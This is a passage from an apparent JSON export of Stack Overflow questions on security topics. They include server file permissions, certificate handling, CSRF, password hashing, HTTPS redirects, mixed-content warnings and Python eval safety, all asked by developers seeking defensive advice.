www-data?","body":"<p>This might be a noob question, but can't find an answer anywhere.</p>\n\n<p>I have a problem, which <a href=\"http://stackoverflow.com/questions/3483832/another-file-permissions-problem\">http://stackoverflow.com/questions/3483832/another-file-permissions-problem</a> have helped me to ALMOST solve.</p>\n\n<p>I have created a user in linux (<strong>danny</strong>) which has sudo access.\nI have also created a new group which name ALSO is <strong>danny</strong>, and added the user <strong>danny</strong> to that group. <strong>This group has sudo (root) access.</strong></p>\n\n<p>I have all files and folders in my <strong>www</strong> folder owned by danny/danny group.</p>\n\n<p>I have an image-upload code which is <strong>php</strong>. This code cannot upload images to a folder called \"<strong>images</strong>\" folder which is under the <strong>www</strong> folder, UNLESS I give the images folder <strong>777</strong> permissions.</p>\n\n<p>So, I have followed the answer on the linked question, and have figured out that the user which the upload-script is run as is \"<strong>www-data</strong>\".</p>\n\n<p>According to the answer on the link to the other question I posted, I need to add <strong>www-data</strong> to a group... But I am stuck here...</p>\n\n<p>Which group should I add to? What should I do from here?</p>\n\n<p>Any tips are appreciated.</p>\n\n<p>Btw, here is some info about www-data and danny</p>\n\n<pre><code>  id www-data:\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  id danny\n  uid=1000(danny) gid=33(www-data) groups=33(www-data)\n</code></pre>\n\n<p>Thanks and if you need more input, just let me know...</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13119641,"title":"Java Programmatically read informations from a Key/Certificate","body":"<p>I'm tryin to build a certificate/key management tool, but i don't understand how to obtain md5 fingerprint of a certificate/key. </p>\n\n<p>For example if i use keytool command on a keystore i obtain the </p>\n\n<pre><code>Keystore type: JKS\nKeystore provider: SUN\n\nYour keystore contains 1 entry\n\nAlias name: myname\nCreation date: 21-Aug-2011\nEntry type: PrivateKeyEntry\nCertificate chain length: 1\nCertificate[1]:\nOwner: CN=bla bla, L=bla, ST=bla\nIssuer: CN=bla bla, L=bla, ST=bla\nSerial number: 123w3qa\nValid from: Sun Aug 21 00:12:31 CEST 2011 until: Mon Jul 28 00:12:31 CEST 2110\nCertificate fingerprints:\n         MD5:  1A:DE:60:21:DE:B1:BF:C3:D1:AD:11:F1:21:22:D7:9E\n         SHA1: 72:3A:D9:2E:1A:DE:60:21:DE:B1:BF:C3:D1:AD:11:F1:21:22:D7:9E\n         Signature algorithm name: SHA256withRSA\n         Version: 3\n\nExtensions:\n\n#1: ObjectId: 2.5.29.14 Criticality=false\nSubjectKeyIdentifier [\nKeyIdentifier [\n0000: AA EA FA FE 34 DA 6E C6   FC 8B 6C DE S9 21 S9 S4  ......^...l.I!.D\n0010: S3 33 29 SD                                        .S..\n]\n]\n\n*******************************************\n*******************************************\n</code></pre>\n\n<p>Now i want to obtain via java the following informations: \n1. MD5 fingerprint\n2. KeyIdentifier</p>\n\n<p>I obtained some informations using X500Certificate object and X500Principal(for example date from and to, owner, issuer, alias name), but i didn't found where i can obtain other informations. Can someone help me? </p>\n"},{"tags":["windows","security","api","debugging","winapi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13109513,"title":"RPC integrity privilege in processs","body":"<p>I have 2 processes running in my system (Windows 7 )one of them is with medium integrity level and the second is with a low integrity level.</p>\n\n<p>if my medium integrity send an RPC call to the low integrity process does the code get execute in a low or medium integrity level ?</p>\n"},{"tags":["security","module","playframework"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1108,"score":3,"question_id":7387759,"title":"How to customize login.html while using Secure Module in play framework","body":"<p>I am newbie to play. Since I am using Secure Module in play framework with japid. I have designed the custom login templete and called the templete in \"beforeLogin.html\" tag. I need to show my custom login templete instead of Secure Module's login.html templete. I have tried to override login.html using play secure:ov --login. It successfully overrides the login page and puts the page locally in Secure folder. But I need to user my own custom login page instead of Secure Module's login.html</p>\n"},{"tags":["android","security","passwords","android-backup-service"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":53,"score":3,"question_id":12282019,"title":"Backup passwords in Android","body":"<p>I want to use <a href=\"http://developer.android.com/guide/topics/data/backup.html\" rel=\"nofollow\">Android Backup Service</a> to backup some settings of my application, including usernames and passwords. But this service is not safe.</p>\n\n<p>Google directly writes about it:</p>\n\n<blockquote>\n  <p>Caution: Because the cloud storage and transport service can differ\n  from device to device, Android makes no guarantees about the security\n  of your data while using backup. You should always be cautious about\n  using backup to store sensitive data, such as usernames and passwords.</p>\n</blockquote>\n\n<p>What is the best way to make our backup safe? Is anybody know simplest and safest methods to create secure data backup?</p>\n"},{"tags":["c#","asp.net","wcf","security","wshttpbinding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12815423,"title":"ASP.NET: Programmatically check if the secutiry mode is set to \"None\" or \"TransportWithMessageCredential\"?","body":"<p>How can I programmatically check if the secutiry mode of the wsHttpBinding in the web.config is set to \"<code>None</code>\" or \"<code>TransportWithMessageCredential</code>\" ?\nI want the webapplication to behave differently when I change the security setting in the web.config.</p>\n\n<p><strong>web.config:</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n  &lt;configSections&gt;\n    ...\n  &lt;system.serviceModel&gt;\n    &lt;services&gt;\n      &lt;service behaviorConfiguration=\"PirIS.Web.WCF.MobileServiceBehavior\"\n               name=\"PirIS.Web.WCF.MobileService\"&gt;\n        &lt;endpoint address=\"\"\n                  binding=\"wsHttpBinding\"\n                  bindingConfiguration=\"wsHttpBinding_MobileService\"\n                  contract=\"PirIS.Web.WCF.IMobileService\"&gt;\n          &lt;identity&gt;\n            &lt;dns value=\"localhost\" /&gt;\n          &lt;/identity&gt;\n        &lt;/endpoint&gt;\n        &lt;endpoint address=\"mex\" binding=\"mexHttpBinding\" contract=\"IMetadataExchange\" /&gt;\n      &lt;/service&gt;\n    &lt;/services&gt;\n    &lt;bindings&gt;\n      &lt;wsHttpBinding&gt;\n        &lt;binding name=\"wsHttpBinding_MobileService\" &gt;\n          &lt;security mode=\"None\"&gt;\n          &lt;!--&lt;security mode=\"TransportWithMessageCredential\"&gt;--&gt;\n            &lt;message clientCredentialType=\"UserName\" negotiateServiceCredential=\"False\" /&gt;\n            &lt;transport clientCredentialType=\"None\" /&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/wsHttpBinding&gt;\n    &lt;/bindings&gt;\n    ...\n  &lt;/system.serviceModel&gt;\n  ...\n&lt;/configuration&gt;\n</code></pre>\n"},{"tags":["security","ruby-on-rails-3.2","web-security","csrf","csrf-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13112787,"title":"CSRF Protection on static pages","body":"<p>I have a static site which has forms. The forms submits to a Rails endpoint which captures the submitted data. The static site and the Rails endpoint are on the same domain, on different subdomains and all traffic is completely on HTTPS.</p>\n\n<p>I understand how Rails CSRF works for server generated forms. But in my case, these forms are on static HTML pages. I understand all request headers can be faked, so can't rely on that.</p>\n\n<p>If a strong solution is not possible for this scenario then my last option would be to move to server generated forms (which I want to avoid for now).</p>\n\n<p>Any suggestions on a good approach to this would be most welcome. Or any pointers to a system or a library which already does this.</p>\n\n<p>Thanks</p>\n"},{"tags":["spring","security","session","context","sharing"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13081304,"title":"How can we flow user session from one spring application context to another?","body":"<p>How can we flow user session from one spring application context to another?\nBasically I have one spring application representing Web Layer and another spring application representing REST layer.  I want when Web Layer access the REST layer the session containing user info to be available from to Web at REST layer for authentication.</p>\n\n<p>Please suggest.</p>\n\n<p><em>Edit after receiving first ans:</em> <br>\nAt present we do have Web Layer in place along with security and all the other flows.  What we are about to intended is to introduce REST layer.  This REST layer is suppose to be called by present Web Layer and by other APIs.  We do not want to make any changes for Web Layer, but at the same time need security to be placed at REST Layer that should work for Web Layer too when calling REST services.</p>\n"},{"tags":["php","security","md5"],"answer_count":9,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":502,"score":1,"question_id":5990613,"title":"How can I make MD5 more secure? Or is it really necessary?","body":"<p>I'm storing username and password in a MySQL database and have them hashed using MD5. However, I'm only using the standard PHP function without any modification. Now, I read that MD5 is broken. How are you doing it? Do you run it several times through a different hash mechanism or add some form of salt?</p>\n"},{"tags":["security","joomla","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":80,"score":-1,"question_id":13114157,"title":"how to fix to Joomla 1.5 URL Redirecting Vulnerability?","body":"<p>I have today discovred a problem on my website </p>\n\n<p>This vulnerability sends my visitor to a custom url \"ya.ru\"</p>\n\n<p>Here you can see what is the <strong>vulnerability</strong> </p>\n\n<p><strong>http://www.exploit-db.com/exploits/14722</strong></p>\n\n<p>help to find a way to fix please \nthank you in advance</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13114580,"title":"Limiting Access to a Specific Page By Requiring Sequential Order of Page Views","body":"<p>I am trying to limit page access so that the user must enter the page in question by clicking a button on 1 of 3 pages.</p>\n\n<p>So, to be clear, page x can only be accessed if the user clicks a button from page 1, 2, or 3.</p>\n\n<p>I've tried using <code>isset</code> if/<code>else</code> blocks, but cannot seem to make any progress with limiting the page access in this way. If anyone has any suggestions I'd be very grateful!</p>\n"},{"tags":["security","web-applications","open-source"],"answer_count":6,"favorite_count":13,"up_vote_count":15,"down_vote_count":0,"view_count":3268,"score":15,"question_id":365309,"title":"Where can I find a deliberately insecure open source web application?","body":"<p>As a developer, I've learned that I usually gain a better understanding of best/worst practices through experience.  The area of web application security isn't really somewhere where my organization can afford to let developers learn through trial and error.  </p>\n\n<p>So looking for a hands-on approach to knowledge sharing of best practices in web application security, I was thinking that it would be useful to have an open source application that was deliberately built to be insecure in order to help teach junior developers about application security.</p>\n\n<p>Does anyone out there know where to find something like this?</p>\n"},{"tags":["asp.net","security","ssl","securityswitch"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1786,"score":3,"question_id":6601467,"title":"Only secure content is displayed","body":"<p>Our company website (ASP.Net 3.5) uses SSL to secure the checkout pages. Users are getting the \"Only secure content is displayed\" message at the bottom of IE. Many of them freak out and abandon their cart and we loose a sale.\nThe secure contect is in a subfolder and IIS7 is configured to require SSL on that subfolder.\nI used the IE dev toolbar to try to see what causes this and get the following:</p>\n\n<pre><code>SEC7111: HTTPS security is compromised by http://www.myCompany.com/WebResource.axd?d=dJde0NlmEkubWa-RO0uUtg2&amp;t=633833944103732959 \nLogin.aspx\nSEC7111: HTTPS security is compromised by http://www.myCompany.com/ScriptResource.axd?d=-4ipYW6oMR5JKr02ccZdGEkLMeXnvSWAqFrG98oQ5--7NMeKPsjwSVXJeHzqvzhsd1bLH85MgJQdnNYNUNH1gAXPGD9gbk2fwYnJI-0eaw41&amp;t=ffffffffa6437166 \nLogin.aspx\nSEC7111: HTTPS security is compromised by http://www.myCompany.com/ScriptResource.axd?d=-4ipYW6oMR5JKr02ccZdGEkLMeXnvSWAqFrG98oQ5--7NMeKPsjwSVXJeHzqvzhsvkt8QvjGkHw2IYbLkF5RHr1t21TH0EEkLDcUGVpdxdE1&amp;t=ffffffffa6437166 \nLogin.aspx\n</code></pre>\n\n<p>We also had a bunch of offending javascript files but worked around those by copying them into the secure directory. That made Chrome and Firefox happy but we still get the message with IE.</p>\n\n<p>How can I stop the popup and keep from scaring my customers away?</p>\n"},{"tags":["java","security","byte","des"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":3682,"score":0,"question_id":5364338,"title":"Converted secret key into bytes, how to convert it back to secrect key?","body":"<p>I convert the secretkey into bytes with following code</p>\n\n<pre><code>SecretKey key = KeyGenerator.getInstance(\"DES\").generateKey();\nbyte[] bkey=key.getEncoded();\n</code></pre>\n\n<p>Now how do I get the key from <code>bkey</code>? I tried:</p>\n\n<pre><code>SecretKeySpec secretkey = new SecretKeySpec(bkey,\"DES\");   \nSecretKeyFactory sfkey = SecretKeyFactory.getInstance(\"DES\");\nSecretKey skey = sfkey.generateSecret(secretkey);\n</code></pre>\n\n<p>I get the following error:</p>\n\n<pre><code>Error during Exception java.security.spec.InvalidKeySpecException: Inappropriate key specification\n</code></pre>\n"},{"tags":["security","windows-7","networking","network-programming","sniffing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2411,"score":1,"question_id":4004538,"title":"How to put NIC into promiscuous mode?","body":"<p>Hi\nI want to put my NIC into promiscuous mode. Why? \nBecause I wrote app which is able potentially to detect sniffing in my local network (send modyfied appropriately ethernet packets). I just want now check it out, so in my second comp I want to set up promisc mode. \nThere's Windows 7 and simply Dell Wireless 1397 WLAN Mini-Card...if it makes a difference.</p>\n\n<p>How can I do this?</p>\n"},{"tags":["php","database","security","get"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13112152,"title":"PHP Access Database with GET Security","body":"<p>I am writing a database interface using PHP.  One of the functions of the database is to allow members to login and register for events online.  I would like to create a php file that would create a dynamic calendar file users can subscribe to.  Something to the effect of www.hostname.net/my_calendar.php?memid=123.  The file then will search the database for events member 123 has registered for and create a calendar file on the fly.  My concern the security of using the members' id number for this purpose.  Is there a good way of accomplishing this with a reasonable amount of security, or may there be a security issue here that I am not considering.</p>\n"},{"tags":["python","security","networking","eval","twisted"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13111410,"title":"Eval safety in python, string pulled from JSON","body":"<p>I'm wracking my brain trying to find a way to exploit this setup. My concept is this: my twisted server receives messages (via <code>LineReceiver</code>). The messages are base64 JSON, which SHOULD contain a single dictionary. The dictionary has a <code>\"INSTRUCTION\"</code> key which indicates what sort of client action the server should be processing.</p>\n\n<p>At this portion of the program, <code>line</code> is a base64 string received over the network.</p>\n\n<pre><code>def Decode(line):\n    return json.loads(base64.b64decode(line))\n</code></pre>\n\n<p>And the interpretation (inside a twisted <code>Protocol</code> object)</p>\n\n<pre><code>def lineReceived(self, line):\n    instruction = Decode(line)  #dict\n    if instruction and \"INSTRUCTION\" in instruction:\n        if instruction[\"INSTRUCTION\"] in (\"register\", \"join\", \"create\", \n         \"list\", \"passturn\", \"impmove\", \"warpmove\",\"laserattack\",\n         \"torpattack\", \"mine\", \"data\", \"status\"):\n            cmdstring = instruction[\"INSTRUCTION\"] + \"(self)\"\n            eval(cmdstring)\n</code></pre>\n\n<p>Why I think it's safe:</p>\n\n<ul>\n<li>eval will only run if I get a plain string as the value.</li>\n<li>JSON can't pack complex objecst, only python basics. An attacker shouldn't have <code>__str__</code> access to what I receive, right?</li>\n<li>I'm using eval to provide a less readable but much more compact replacement for a dozen <code>if instruction[\"INSTRUCTION\"] == \"functionA\": functionA(self)</code> lines. I'm just running eval to choose a function from a specific list.</li>\n</ul>\n\n<p>Is this safe? Is this considered acceptable style or form? Is this block of code robust enough for a multiplayer game, since the client cannot be trusted? (Validation that the instruction follows the game rules is later, here I want to protect my server from destructive tinkering.)</p>\n\n<p>Is there a better way to do what I'm attempting (remote execution of a function, I suppose) that is more standard / safe?</p>\n"},{"tags":["php","html","security","cookies","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":13111135,"title":"Setting Secure Cookies","body":"<p>So i managed to solve my original question from <a href=\"http://stackoverflow.com/questions/13110663/forcing-https-over-http\">this</a> post. But according to the answer </p>\n\n<blockquote>\n  <p>the cookies and query parameters with possibly sensitive data has already been sent in clear text, so remember to use the secure cookie atribute if you use cookies.</p>\n</blockquote>\n\n<p>But if I have an <code>index.php</code> inside of a folder, where exactly should I set the cookie secure flag. At the top of <code>index.php</code> or somewhere in root directory?</p>\n"},{"tags":["security","https","httprequest"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13097971,"title":"Is it necessary to use HTTPS for server side requests?","body":"<p>I'm allowing users to log in to my site using third party credentials (let's call it SocialFoo). Users submit their username and password for SocialFoo via a POST over HTTPS. After the POST is made, on the server side, I validate the credentials via an API call to SocialFoo. </p>\n\n<p>Is there any security benefit to making the API call to SocialFoo via HTTPS rather than HTTP? Since this request is theoretically not exposed to user, is there a security risk beyond packet sniffers at the data center?</p>\n"},{"tags":["security",".htaccess","http","https","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":43,"score":0,"question_id":13110663,"title":"Forcing HTTPS over HTTP","body":"<p>So I want to force the user to access the https version of my page rather than the http. And according to <a href=\"http://stackoverflow.com/questions/8476324/using-https-instead-of-http\">this</a> post all I have to do is this:</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{SERVER_PORT} 80 \nRewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n</code></pre>\n\n<p>But <em>MY</em> site resides in a folder within the main directory, so it's in <code>www.domain.com/Folder</code>. So should this htaccess code go inside the main directory or in the subdirectory. Because I do not want to change the way the access the main site, only the folder. </p>\n"},{"tags":["python","security","pdf","reportlab"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13109867,"title":"python: pdf - set password protected print, copy, paste options?","body":"<p>Hi I'm looking for a python lib that will allow me to set password protected print, copy, paste options on some existing pdfs</p>\n\n<p>I looked at the reportlab pdfencrypt module: this has exactly the options I need, but the open source version is heavily restricted - cant even set a real password, and the license is not an option (over £1000/year) - this will be relatively low volume (&lt; 1000 docs processed per year), and the client is a non-profit organisation</p>\n\n<p>any suggestions greatly appreciated! </p>\n"},{"tags":["javascript","html5","security","canvas","cors"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":12822576,"title":"canvas toDataURL for uploaded file throws security error on same domain","body":"<p>so you select an image via the file input, the selected image file gets gets turned into a window.url.createobjecturl and passed to a hidden \"img\" element unmodified, then a preview of the image element's current data is rendered into a canvas element. so far, so good. but then when i try to render the canvas.toDataURL i keep getting that aggravating security exception about it being insecure. this happens on chrome and firefox.</p>\n\n<p>understand that this is a file OBJECT that was select with an html INPUT element, and NOT via a \"file://\" url, and the webpage is an actual webpage, and is loaded via \"http://\" and not via \"file://\".</p>\n\n<p>the image file has not even left the browser yet to go to the server, so there should not be any domain issues. it's just a raw blob being asserted as the source to an image, which is then telling the canvas to update its preview, which it does. after that, when trying to saved the canvas contents, the browser triggers an error.</p>\n\n<p>i have read all of the specs regarding scenarious where the canvas element becomes tainted, and this scenario does not meet ANY of those scenarios.</p>\n\n<p>i've seen a similar example on mozilla demos of some one offering code snippets to show people how to do the same thing, but i have not seen if any one had problems with it.</p>\n\n<p>any ideas? TIA</p>\n\n<p>#</p>\n\n<p>=== UPDATE ===</p>\n\n<p>#</p>\n\n<p>okay, i've figured out what the PROBLEM is, but i'm still not clear on WHY it's a problem. here's the setup:</p>\n\n<p>1) page is called via, eg, \"example.com/\"</p>\n\n<p>2) script is called via: \"r.example.com/script.js\"</p>\n\n<p>3) if script loads ANY image from \"r.example.com\", to use for the PAGE DESIGN, and NOT the canvas, it some how taints the entire page. in this case i draw the entire page via javascript, so the header image is tainting the rest of the page. if i change the header image to come from \"example.com\" instead of \"r.example.com\", the problem with the canvas complaining about not being secure goes away, and everything is fine.</p>\n\n<p>what i don't understand is WHY this is happening. the header image is being loaded from the same place as the javascript file, and, for the sake of argument i even set the access-control-allow-origin to \"*\", for both the main domain and the subdomain, which makes no difference.</p>\n\n<p>so, access control is allowed from anywhere, the header image is coming from the same place as the javascript file, and it is NOT being drawn to the canvas (that's a user file), so why would drawing the header image via javascript taint a canvas that it has nothing to do with??? also, the css and other media are loaded from the same subdomain, but this does not affect the page, so long as the script did not load them [o_0].</p>\n\n<p>i want to keep all of my resources on a separate subdomain for scalability, so, this issue is frustrating, because i don't quite understand why it's still happening...</p>\n"},{"tags":["php","security","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":8138213,"title":"fail to use session in php","body":"<p>I read a bit on how to secure a session and what I decided to do was to save the session_id to the database, and then save it to a session variable after it has been encrypted.</p>\n\n<p>Here is the class that I used for the encryption (it was writen by Orielly books author):</p>\n\n<p><a href=\"https://github.com/ezimuel/PHP-Secure-Session/blob/master/SecureSession.php\" rel=\"nofollow\">Encrypted class using session_set_save_handler</a></p>\n\n<p>The I apply it this way:</p>\n\n<pre><code>ini_set('session.use_only_cookies',true);       \n\n//calls the session class.  \n require_once(dirname(__file__).\"/../../Administrator/secure_session.php\");\n             session_start();\n\n            if( !isset($_SESSION['mod']) )          \n            {   \n                Moderator::insert_moderator($name,session_id());    \n\n                $_SESSION['mod']= session_id();\n\n                $_SESSION['time']=time();\n\n                echo \"&lt;br/&gt;Moderator session: \".$_SESSION['mod'];\n            }\n</code></pre>\n\n<p>This is the exception which is being thrown:</p>\n\n<blockquote>\n  <p>Fatal error: Uncaught exception 'Exception' with message 'I cannot generate a secure pseudo-random key. Please use PHP >= 5.3 or Mcrypt extension' in C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php:74 Stack trace: #0 C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php(107): SecureSession->_randomKey(32) #1 [internal function]: SecureSession->open('C:\\xampp\\htdocs...', 'PHPSESSID') #2 C:\\xampp\\htdocs\\PoliticalForum\\StoredProcedure\\User\\headerSite.php(43): session_start() #3 C:\\xampp\\htdocs\\PoliticalForum\\mainHome.php(14): include_once('C:\\xampp\\htdocs...') #4 {main} thrown in C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php on line 74</p>\n</blockquote>\n\n<p>What am I doing wrong, how can I fix this, cause I dont understand much of encryption!</p>\n"},{"tags":["java","security","google-app-engine","pdf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":29,"score":-2,"question_id":13108148,"title":"File transfer from 3rd party site to client through GAE/J","body":"<p>Now i have a site say X.com which has a few images &amp; a pdf.</p>\n\n<p>I want users to be able to download / see them on browser but not directly but from my GAE website.</p>\n\n<p>Can i use URL Fetch service for this?</p>\n\n<p>How do i download file from an URL of X to GAE server and then pass that data as part of response to client request?\nWill this be a very expensive operation?</p>\n\n<p>If i do this can i close access to server hosting site X.com to only accept request from GAE?\nHow do i do the IP settings to achieve this?</p>\n\n<p>What other security can be put on X so data isn't directly accessible?</p>\n"},{"tags":["php","iphone","xcode","security","privatekey"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12343257,"title":"Decrypt data Xcode to PHP","body":"<p>I'm making an application with Xcode which encrypts information using the private key of a certificate, this information is sent to a server using a POST in PHP (Eg: username = \"encrypted data\") and I want to decrypt this information in the PHP with the private key and get the real information, I encrypted the information with SecKeyEncrypt in Xcode and then sent to PHP, but how I can decrypt it with the private key in php?</p>\n"},{"tags":["security","jmx"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":365,"score":1,"question_id":491637,"title":"JMX htmladapter user security","body":"<p>Is it possible to have user based security permissions for JMX on a JMX generated webpage? If so, how?</p>\n\n<p>We're currently using a HtmlAdaptorServer class to provide a web front end. The problem comes where this JMX site is becoming very big and we want to allow some mbeans on a server for everyone and restrict more risky mbeans to certain users.</p>\n\n<p>The java policy authentication in the ConnectorServer classes is what I'd like to aim for, but I don't know how to link these with the htmladaptor.</p>\n"},{"tags":["security","wmi","remote-access","dcom"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":684,"score":2,"question_id":3678190,"title":"Querying remote system via WMI returns access denied for non-administrator","body":"<p>I have a simple WMI query that runs fine locally, but querying a remote system gives an access denied error. When I add the local user to the remote system as member of the administrator group, the query works as expected, but I don't want to have that user as a member of that group.</p>\n\n<p>I already tried the following things, unfortunately not successful so far:</p>\n\n<ul>\n<li>I enabled RemoteAdmin for the firewall (netsh firewall set service RemoteAdmin enable)</li>\n<li>I added the user with all possible access rights to the WMI Security settings (for the root name space, and I also checked that the settings are correctly propagated to the namespace I'm querying, root/cimv2) via wmimgmt.msc</li>\n<li>I enabled remote access for the user in DCOM COM security</li>\n</ul>\n\n<p>I still get the same error every time I run my query, is there anything else that I may have missed?</p>\n"},{"tags":["security","pdf"],"answer_count":7,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":3212,"score":3,"question_id":4930914,"title":"Prevent PDF file from downloading and printing","body":"<p>I am trying to find a way to prevent a PDF from being printed or downloaded when view from web.  Also, it is prefered that user cannot print screen.</p>\n\n<p>I am thinking about converting those PDF files to Flash.  Any other ideas?</p>\n"},{"tags":["java","security","applet","signing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13088569,"title":"How to use a provided keystore to sign a jar file","body":"<p>My client gave me a keystore for the purpose of signing a Java applet jar file. I exported a .cer file from it and then imported it into cacerts but I keep getting \"Certificate chain not found\" error. It also says \"alias must reference a valid KeyStore key entry containing a private key and corresponsing public key certificate chain.\"</p>\n\n<p>I tried Gaston's suggestion below, it went as follows:</p>\n\n<pre><code>jarsigner -keystore \"D:\\My Documents\\keystore\\MyKeyStore.jks\" -storepass mypass -signedjar my_signed_jar.jar\" unsigned.jar myalias\n\nWarning:\nThe signer's certificate chain is not validated.\n</code></pre>\n"},{"tags":["php","linux","security","optimization","shell-exec"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13104396,"title":"PHP shell_exec() - Run directly, or perform a cron (bash/php) and include MySQL layer?","body":"<p>Sorry if the title is vague - I wasn't quite sure how to word it!</p>\n\n<p><strong>What I'm Doing</strong></p>\n\n<p>I'm running a Linux command to output data into a variable, parse the data, and output it as an array. Array values will be displayed on a page using PHP, and this PHP page output is requested via AJAX every 10 seconds so, in effect, the data will be retrieved and displayed/updated every 10 seconds. There could be as many as 10,000 characters being parsed on every request, although this is usually much lower.</p>\n\n<p><strong>Alternative Idea</strong></p>\n\n<p>I want to know if there is a better* alternative method of retrieving this data every 10 seconds, as multiple users (&lt;10) will be having this command executed automatically for them.</p>\n\n<p>A cronjob running on the server could execute either bash or php (which is faster?) to grab the data and store it in a MySQL database. Then, any AJAX calls to the PHP output would return values in the MySQL database rather than making a direct call to execute server code every 10 seconds.</p>\n\n<p><strong>Why?</strong></p>\n\n<p>I know there are security concerns with running execs directly from PHP, and (I hope this isn't micro-optimisation) I'm worried about CPU usage on the server. The server is running a <em>sempron</em> processor. Yes, they do still exist.</p>\n\n<p>Having this only execute when the user is on the page (idea #1) means that the server isn't running code that doesn't need to be run. However, is this slow and insecure?</p>\n\n<p>Just in case the type of linux command may be of assistance in determining it's efficiency:</p>\n\n<p><code>shell_exec(\"transmission-remote $host:$port --auth $username:$password -l\");</code></p>\n\n<p>I'm hoping that there are differences in efficiency and level of security with the two methods I have outlined above, and that this <em>isn't</em> just micro-micro-optimisation. If there are alternative methods that are better*, I'd love to learn about these! :)</p>\n"},{"tags":["php","html","security","http","https"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13103707,"title":"Converting to HTTPS","body":"<p>I have an https site and google displays the lock with the yellow triangle on top meaning:</p>\n\n<blockquote>\n  <p>The site uses SSL, but Google Chrome has detected insecure content on\n  the page.  Be careful if you’re entering sensitive information on this\n  page.  Insecure content can provide a loophole for someone to change\n  the look of the page.</p>\n</blockquote>\n\n<p>I want to change my site so it is completely secure and I get the green lock. However when I try to access my page through https like so <code>https://www.domain.com</code> rather than <code>http://www.domain.com</code>, most things don't work. Chrome's inspector says stuff like:</p>\n\n<blockquote>\n  <p>The page at <a href=\"https://www.domain.com/Folder/\" rel=\"nofollow\">https://www.domain.com/Folder/</a> displayed insecure content\n  from <a href=\"http://website.com/media/images/photo.jpg\" rel=\"nofollow\">http://website.com/media/images/photo.jpg</a>.</p>\n</blockquote>\n\n<p>Is that just because the page I'm getting my photos from is http? What are the steps I should take to start converting my entire site to https (in terms of changing code)?</p>\n"},{"tags":["xcode","osx","security","rsa","key-pair"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12800119,"title":"Objective C Secure.h RSA key-pair generating","body":"<p>I tried to ask a follow-up question on <a href=\"http://stackoverflow.com/questions/10222524/rsa-implementations-in-objective-c\">this topic</a> with example code on how to generate rsa-keys which did not work for me, but it got deleted by moderator for some reason. So I'm going to try agin with posting a new question.</p>\n\n<p>My problem with that answer is that Xcode tells me that \"kSecPrivateKeyAttrs\" and \"kSecPublicKeyAttrs\" identifiers is not declared. These identifiers are mentioned in apple developer docs, but they does not seem to exist in Secure framework. </p>\n\n<p>I'm using Xcode 4.5 and OS X SDK 10.8.</p>\n\n<p>appreciate any help i can get, I'm fairly new att OC-programming.\nIf i get this to work, I Would also like to know how to get pubkey and privkey as NSString or NSData. </p>\n\n<p>Thank you</p>\n\n<p>EDIT: I still have problems with this, surely there's someone else out there with the same problem that have fixed it and can point me in the right direction?</p>\n\n<p>EDIT2 As I Said, i was trying out the code from the link i posted, but here is the full code anyways:</p>\n\n<p>Keypair.h</p>\n\n<pre><code>#import &lt;Security/Security.h&gt;\n\n@interface Keypair\n{\n    SecKeyRef publicKey;\n    SecKeyRef privateKey;\n    NSData *publicTag;\n    NSData *privateTag;\n }\n - 